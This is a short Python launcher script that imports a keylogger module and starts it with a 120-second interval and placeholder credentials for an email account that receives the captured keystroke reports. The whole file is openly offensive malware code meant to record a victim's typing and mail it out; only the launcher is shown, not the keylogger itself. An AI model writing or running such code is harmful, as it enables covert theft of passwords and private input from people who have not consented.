#!/usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(120, "emailid-to-receive-report", "passwd-for-the-email")
my_keylogger.start()
